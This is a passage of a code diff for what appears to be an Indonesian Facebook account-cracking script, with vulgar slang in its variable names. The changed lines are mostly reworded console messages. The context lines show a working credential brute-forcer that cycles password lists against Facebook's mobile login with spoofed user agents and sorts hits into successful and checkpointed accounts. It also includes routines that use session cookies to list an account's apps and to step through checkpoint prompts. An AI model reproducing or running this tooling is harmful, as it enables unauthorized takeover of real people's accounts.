SM-M127F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; IN2023 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(50) Build/S1RFS32.27-25-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220",
 					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 					"sec-fetch-site": "none",
 					"sec-fetch-mode": "navigate",
@@ -650,7 +680,7 @@ class bruteforce:
 
 	def kontol(self, user, pwx):
 		global loop, ok, cp
-		sys.stdout.write("\rCrack : %s/%s %s%s%s/%s%s%s"%(loop,len(id),H,len(ok),N,K,len(cp),N));sys.stdout.flush()
+		sys.stdout.write("\r Crack: %s/%s %s%s%s/%s%s%s"%(loop,len(id),H,len(ok),N,K,len(cp),N));sys.stdout.flush()
 		for pw in pwx:
 			ses = requests.Session()
 			url = ses.get("https://m.facebook.com/login.php")
@@ -685,17 +715,17 @@ def cek_aplikasi(coki):
 		fick = psot.find("form", {"method":"post"})
 		game = [memek.text for memek in fick.find_all("h3")]
 		if len(game) == 0:
-			print("\rTidak ada aplikasi aktif")
+			print("\r    Tidak ada aplikasi aktif")
 		else:
 			for kontol in range(len(game)):
-				print("\n    %s %s "%(kontol+1, game[kontol].replace("Di akses pada ", "Di tambahkan pada")));time.sleep(1)
+				print("\n    %s %s "%(kontol+1, game[kontol].replace(" Di akses pada ", "Di tambahkan pada")));time.sleep(1)
 		#- Kadarluarsa
 		link = ses.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie":coki})
 		post = parser(link.text,"html.parser")
 		cari = post.find("form",{"method":"post"})
 		game = [kontol_.text for kontol_ in cari.find_all("h3")]
 		if len(game) == 0:
-			print("\rTidak ada aplikasi kadarluarsa")
+			print("\r    Tidak ada aplikasi kadarluarsa")
 		else:
 			for aplikasi in range(len(game)):
 				print("\n    %s %s"%(aplikasi+1, game[aplikasi].replace("Kadarluarsa pada","Tidak di akses pada")));time.sleep(1)
@@ -706,16 +736,16 @@ def cek_aplikasi(coki):
 			cari = post.find("form",{"method":"post"})
 			game = [_kontol_.text for _kontol_ in cari.find_all("h3")]
 			if len(game) == 0:
-				print("\rTidak ada aplikasi di yang di hapus")
+				print("\r    Tidak ada aplikasi di yang di hapus")
 			else:
 				for khamdihiXD in range(len(game)):
-					print("\n    %s %s"%(khamdihiXD+1, game[khamdihiXD].replace("Di Hapus Pada","Di hapus")))
+					print("\n    %s %s"%(khamdihiXD+1, game[khamdihiXD].replace("Di hapus pada","Di hapus")))
 		except AttributeError:
-			print("Tidak ada aplikasi yang di hapus/cokie invalid!")
+			print("    Tidak ada aplikasi yang di hapus/cokie invalid!")
 
 
 	except AttributeError:
-		print("cokie invalid!!!")
+		print(" × cokie invalid")
 
 def cek_opsi(user,pw):
 	try:
@@ -736,7 +766,7 @@ def cek_opsi(user,pw):
 		_data_ = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(url.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(url.text)).group(1),"try_number": "0","unrecognized_tries": "0","email"   : user,"pass"    : pw,"login"   : "Masuk","bi_xrwh" : "0"}
 		cari = ses.post("https://free.facebook.com/login.php", data = _data_)
 		if "c_user" in ses.cookies.get_dict():
-			print("\nAKUN OK")
+			print("\n    Akun OK tidak terkena sesi♥")
 		elif "checkpoint" in ses.cookies.get_dict():
 			_html_ = parser(cari.text,"html.parser");_date_ = _html_.find("form",{"method":"post"})["action"]
 			_opsi_ = {"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(cari.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(cari.text)).group(1),"checkpoint_data": "","submit[Continue]": "Lanjutkan","nh":re.search('name="nh" value="(.*?)"', str(cari.text)).group(1)}
@@ -744,12 +774,12 @@ def cek_opsi(user,pw):
 			_cek_ = parser(_ke2_.text,"html.parser")
 			_sih_ = _cek_.find_all("option")
 			if len(_sih_) == 0:
-				print("\r%sTidak ada opsi !")
+				print("\r    %sTidak ada opsi ngab !")
 			else:
 				for pram in (_sih_):
 					print("\r     "+pram.text);time.sleep(1)
 		else:
-			print("\rPassword salah !")
+			print("\r     Pewek salah !")
 	except:
 		pass
 
@@ -772,7 +802,7 @@ def main(email,userx):
 		_data_ = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(url.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(url.text)).group(1),"try_number": "0","unrecognized_tries": "0","email"   : email,"pass"    : userx,"login"   : "Masuk","bi_xrwh" : "0"}
 		cari = ses.post("https://free.facebook.com/login.php", data = _data_)
 		if "c_user" in ses.cookies.get_dict():
-			print("\nAKUN OK")
+			print("\n ✓ Akun OK tidak terkena sesi♥")
 		elif "checkpoint" in ses.cookies.get_dict():
 			_html_ = parser(cari.text,"html.parser");_date_ = _html_.find("form",{"method":"post"})["action"]
 			_opsi_ = {"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(cari.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(cari.text)).group(1),"checkpoint_data": "","submit[Continue]": "Lanjutkan","nh":re.search('name="nh" value="(.*?)"', str(cari.text)).group(1)}
@@ -780,13 +810,13 @@ def main(email,userx):
 			_cek_ = parser(_ke2_.text,"html.parser")
 			_sih_ = _cek_.find_all("option")
 			if len(_sih_) == 0:
-				exit("\nTidak Ada Opsi !")
+				exit("\n ✓ Tidak Ada Opsi Ngab !")
 			else:
 				for pram in (_sih_):
-					print("");print(" -> Terdapat %s opsi !"%(len(_sih_)))
+					print("");print(" -> Terdapat %s opsi ngab !"%(len(_sih_)))
 					print(" -> "+pram.text);time.sleep(1)
 		else:
-			print("\n Password salah !")
+			print("\n ×  Pewek salah !")
 	except Exception as u:print(u)
 
 if __name__ == "__main__":
